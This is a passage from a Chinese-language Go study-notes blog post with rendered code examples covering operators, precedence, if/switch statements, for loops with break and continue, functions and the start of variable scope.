class="hljs-string">&quot;a&gt;b&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a&lt;b&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">a</span> &lt;= <span class="hljs-selector-tag">b</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a&lt;=b&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">a</span> &gt;= <span class="hljs-selector-tag">b</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a&gt;=b&quot;</span>)<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/2.png"></p><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>逻辑and运算符，如果两边的操作数都是true，则条件为true，否则为false</td></tr><tr><td>||</td><td>逻辑or运算符，如果两边的操作数有一个true，则条件为true，否则是false</td></tr><tr><td>!</td><td>逻辑not运算符，如果条件为true，则逻辑not条件false，否则是true</td></tr></tbody></table><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-keyword">bool</span> = <span class="hljs-literal">true</span><br><span class="hljs-keyword">var</span> b <span class="hljs-keyword">bool</span> = <span class="hljs-literal">false</span><br><span class="hljs-keyword">if</span> a &amp;&amp; b &#123;<br>fmt.Println(<span class="hljs-string">&quot;a=b&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> a || b &#123;<br>fmt.Println(<span class="hljs-string">&quot;a!=b&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> a &amp;&amp; !b &#123;<br>fmt.Println(<span class="hljs-string">&quot;true&quot;</span>)<br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>&amp;</td><td>按位与运算符”&amp;”是双目运算符。参与运算的两数各对应的二进位相与。</td></tr><tr><td>|</td><td>按位或运算符”|”双目运算符。参与运算的两数各对应的二进位相或</td></tr><tr><td>^</td><td>按位异或运算符”^”双目运算符。参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1</td></tr><tr><td>&lt;&lt;</td><td>左移运算符”&lt;&lt;”双目运算符，左移N位就是乘以2的N次方。功能是把”&lt;&lt;”左边的运算数的各二进位全部左移若干位，由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0</td></tr><tr><td>&gt;&gt;</td><td>右移运算符”&gt;&gt;”双目运算符，右移N位就是除以2的N次方。功能是把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，”&gt;&gt;”右边的数指定移动的位数。</td></tr></tbody></table><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-keyword">uint</span> = <span class="hljs-number">60</span><br><span class="hljs-keyword">var</span> b <span class="hljs-keyword">uint</span> = <span class="hljs-number">13</span><br>fmt.Println(a &amp; b)<br>fmt.Println(a | b)<br>fmt.Println(a ^ b)<br>fmt.Println(a &lt;&lt; <span class="hljs-number">2</span>)<br>fmt.Println(a &gt;&gt; <span class="hljs-number">2</span>)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/4.png"></p><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>=</td><td>简单的赋值运算符，将一个表达式的值赋给一个左值</td></tr><tr><td>+=</td><td>相加后再赋值</td></tr><tr><td>-=</td><td>相减后再赋值</td></tr><tr><td>*=</td><td>相乘后再赋值</td></tr><tr><td>/=</td><td>相除后再赋值</td></tr><tr><td>%=</td><td>求余后再赋值</td></tr><tr><td>&lt;&lt;=</td><td>左移后赋值</td></tr><tr><td>&gt;&gt;=</td><td>右移后赋值</td></tr><tr><td>&amp;=</td><td>按位与后赋值</td></tr><tr><td>^=</td><td>按位异或后赋值</td></tr><tr><td>|=</td><td>按位或后赋值</td></tr></tbody></table><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">package main<br><br>import <span class="hljs-string">&quot;fmt&quot;</span><br><br>func main() &#123;<br>var a int <span class="hljs-operator">=</span> <span class="hljs-number">21</span><br>var <span class="hljs-keyword">c</span> int<br><span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> a<br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> +<span class="hljs-operator">=</span> a<br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> -<span class="hljs-operator">=</span> a<br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> *<span class="hljs-operator">=</span> a<br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> /<span class="hljs-operator">=</span> a<br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span><br><span class="hljs-keyword">c</span> &lt;&lt;<span class="hljs-operator">=</span> <span class="hljs-number">2</span><br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> &gt;&gt;<span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> &amp;<span class="hljs-operator">=</span> <span class="hljs-number">5</span><br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> ^<span class="hljs-operator">=</span> <span class="hljs-number">10</span><br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> |<span class="hljs-operator">=</span> <span class="hljs-number">2</span><br>fmt.Println(<span class="hljs-keyword">c</span>)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/5.png"></p><h3 id="其他运算符"><a href="#其他运算符" class="headerlink" title="其他运算符"></a>其他运算符</h3><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>&amp;</td><td>返回变量的存储地址</td></tr><tr><td>*</td><td>指针变量</td></tr></tbody></table><figure class="highlight nim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nim">package main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">func</span> main() &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-built_in">int</span> = <span class="hljs-number">4</span><br><span class="hljs-keyword">var</span> <span class="hljs-keyword">ptr</span> *<span class="hljs-built_in">int</span><br><span class="hljs-keyword">ptr</span> = &amp;a<br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;a 的值为  %d\n&quot;</span>, a)<br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;*ptr 为 %d\n&quot;</span>, *<span class="hljs-keyword">ptr</span>)<br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;a)<br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, <span class="hljs-keyword">ptr</span>)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/6.png"></p><h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><p>优先级，就是当多个运算符出现在同一个表达式之中时，先执行哪个运算符。运算符优先级如下表：</p><table><thead><tr><th>优先级</th><th>分类</th><th>运算符</th><th>结合性</th></tr></thead><tbody><tr><td>1</td><td>逗号运算符</td><td>,</td><td>从左到右</td></tr><tr><td>2</td><td>赋值运算符</td><td>=、+=、-=、*=、/=、%=、&gt;&gt;=、&lt;&lt;=、&amp;=、^=、|=</td><td>从友到左</td></tr><tr><td>3</td><td>逻辑或</td><td>||</td><td>从左到右</td></tr><tr><td>4</td><td>逻辑与</td><td>&amp;&amp;</td><td>从左到右</td></tr><tr><td>5</td><td>按位或</td><td>|</td><td>从左到右</td></tr><tr><td>6</td><td>按位异或</td><td>^</td><td>从左到右</td></tr><tr><td>7</td><td>按位与</td><td>&amp;</td><td>从左到右</td></tr><tr><td>8</td><td>相等/不等</td><td>==、!=</td><td>从左到右</td></tr><tr><td>9</td><td>关系运算符</td><td>&lt;、&lt;=、&gt;、&gt;=</td><td>从左到右</td></tr><tr><td>10</td><td>位移运算符</td><td>&lt;&lt;、&gt;&gt;</td><td>从左到右</td></tr><tr><td>11</td><td>加法/减法</td><td>+、-</td><td>从左到右</td></tr><tr><td>12</td><td>乘法/除法/除余</td><td>*、/、%</td><td>从左到右</td></tr><tr><td>13</td><td>单目运算符</td><td>!、*（指针）、&amp;、++、–、+（正号）、-（负号）</td><td>从右到左</td></tr><tr><td>14</td><td>后缀运算符</td><td>()、[]、-&gt;</td><td>从左到右</td></tr></tbody></table><p>优先级值越大，表示优先级越高</p><h2 id="Go语言条件语句"><a href="#Go语言条件语句" class="headerlink" title="Go语言条件语句"></a>Go语言条件语句</h2><p>if…else语句的语法如下：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> 布尔表达式&#123;<br><span class="hljs-regexp">/*在布尔表达式为true时执行*/</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-regexp">/*在布尔表达式为false时执行*/</span><br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span><br><br>import <span class="hljs-string">&quot;fmt&quot;</span><br><br>func <span class="hljs-selector-tag">main</span>() &#123;<br><span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span> int<br><span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">b</span> int = <span class="hljs-number">10</span><br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;输入a&quot;</span>)<br>fmt<span class="hljs-selector-class">.Scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;a)<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">a</span> &lt; <span class="hljs-selector-tag">b</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a&lt;10&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">a</span> &gt; <span class="hljs-selector-tag">b</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a&gt;10&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">a</span> == <span class="hljs-selector-tag">b</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a==10&quot;</span>)<br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/7.png"></p><p>switch语句用于基于不同条件执行不同动作，每一个case分支都是唯一的，从上到下逐一测试，直到匹配为止。</p><p>switch语句执行的过程从上到下，直到匹配项，在匹配项后面也不需要加break。</p><p>switch默认情况下case最后自带break语句，匹配成功后就不会执行其他case，如果需要执行后面的case，可以使用<code>fallthrough</code></p><figure class="highlight dart"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dart">package main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br>func main() &#123;<br><span class="hljs-keyword">var</span> <span class="hljs-built_in">num</span> <span class="hljs-built_in">int</span><br>fmt.Scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;<span class="hljs-built_in">num</span>)<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-built_in">num</span> &lt; <span class="hljs-number">60</span>:<br>fmt.Println(<span class="hljs-string">&quot;F&quot;</span>)<br><span class="hljs-keyword">case</span> <span class="hljs-built_in">num</span> &lt; <span class="hljs-number">70</span>:<br>fmt.Println(<span class="hljs-string">&quot;D&quot;</span>)<br><span class="hljs-keyword">case</span> <span class="hljs-built_in">num</span> &lt; <span class="hljs-number">80</span>:<br>fmt.Println(<span class="hljs-string">&quot;C&quot;</span>)<br><span class="hljs-keyword">case</span> <span class="hljs-built_in">num</span> &lt; <span class="hljs-number">90</span>:<br>fmt.Println(<span class="hljs-string">&quot;B&quot;</span>)<br><span class="hljs-keyword">default</span>:<br>fmt.Println(<span class="hljs-string">&quot;A&quot;</span>)<br>&#125;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/8.png"></p><h2 id="Go语言循环语句"><a href="#Go语言循环语句" class="headerlink" title="Go语言循环语句"></a>Go语言循环语句</h2><p>for循环是循环控制结构，可以执行指定次数的循环。</p><p>Go的For循环有三种方式，只有其中的一种使用分号。</p><p>和C的for一样：</p><figure class="highlight abnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs abnf">for inir<span class="hljs-comment">; condition; post &#123;&#125;</span><br></code></pre></div></td></tr></table></figure><p>和C的while一样：</p><figure class="highlight dust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dust"><span class="xml">for condition</span><span class="hljs-template-variable">&#123;&#125;</span><br></code></pre></div></td></tr></table></figure><p>和C的for(;;)一样：</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-class">for </span>&#123;&#125;<br></code></pre></div></td></tr></table></figure><ul><li>init：一般为赋值表达式，给控制变量赋初值</li><li>condition：关系表达式或逻辑表达式，循环控制条件</li><li>post：一般为赋值表达式，给控制变量增量或减量</li></ul><p>计算1加到100的和</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> sum <span class="hljs-keyword">int</span> = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">100</span>; i++ &#123;<br>sum += i<br>&#125;<br>fmt.Print(sum)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/9.png"></p><p>无限的循环，相当于<code>while（1）</code></p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>sum := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> &#123;<br>sum++<br>fmt.Println(sum)<br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>使用<code>break</code>跳出循环，以下示例演示了使用标记和不使用的区别：</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>re:<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">4</span>; i++ &#123;<br>fmt.Println(i)<br><span class="hljs-keyword">for</span> j := <span class="hljs-number">10</span>; j &lt; <span class="hljs-number">13</span>; j++ &#123;<br>fmt.Println(j)<br><span class="hljs-keyword">break</span> re<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/10.png"></p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">4</span>; i++ &#123;<br>fmt.Println(i)<br><span class="hljs-keyword">for</span> j := <span class="hljs-number">10</span>; j &lt; <span class="hljs-number">13</span>; j++ &#123;<br>fmt.Println(j)<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/11.png"></p><p><code>continue</code>语句</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">8</span>; i++ &#123;<br><span class="hljs-keyword">if</span> i == <span class="hljs-number">5</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>fmt.Println(i)<br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/12.png"></p><p>使用了标记和不使用标记的</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;使用标记&quot;</span>)<br>re:<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">5</span>; i++ &#123;<br>fmt.Println(i)<br><span class="hljs-keyword">for</span> j := <span class="hljs-number">10</span>; j &lt; <span class="hljs-number">13</span>; j++ &#123;<br>fmt.Println(j)<br><span class="hljs-keyword">continue</span> re<br>&#125;<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;不使用标记&quot;</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">5</span>; i++ &#123;<br>fmt.Println(i)<br><span class="hljs-keyword">for</span> j := <span class="hljs-number">10</span>; j &lt; <span class="hljs-number">13</span>; j++ &#123;<br>fmt.Println(j)<br><span class="hljs-keyword">continue</span><br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/13.png"></p><h2 id="Go函数"><a href="#Go函数" class="headerlink" title="Go函数"></a>Go函数</h2><h3 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h3><p>go的函数定义格式如下：</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">func_name</span> <span class="hljs-params">([parameter list])</span> [<span class="hljs-title">return</span> <span class="hljs-title">types</span>]</span>&#123;<br>函数体<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>func：函数由func开始声明</li><li>func_name：函数名称，参数列表和返回值类型构成了函数签名</li><li>parameter list：参数列表，参数就像一个占位符，当函数被调用的时候，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数。参数是可选的。</li><li>return types：返回类型，函数返回一列值。return types是该列值得数据类型。有些功能不需要返回值，这种情况下，不是必须的。</li></ul><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(num1, num2 <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">int</span></span> &#123;<br><span class="hljs-keyword">return</span> num1 + num2<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> ret <span class="hljs-keyword">int</span><br>ret = add(<span class="hljs-number">15</span>, <span class="hljs-number">30</span>)<br>fmt.Print(ret)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/14.png"></p><h2 id="Go变量作用域"><a href="#Go变量作用域" class="headerlink" title="Go变量作用域"></a>Go变量作用域</h2><p>作用域为已声明标识符所表示的常量、类型、变量、函数或包在源代码中的作用范围。</p><p>Go中的变量可以在三个地方声明：</p><ul><li>函数内定义的变量称为局部变量</li><li>函数外定义的变量称为全局变量</li><li>函数定义的变量称为形式参数</li></ul><figure 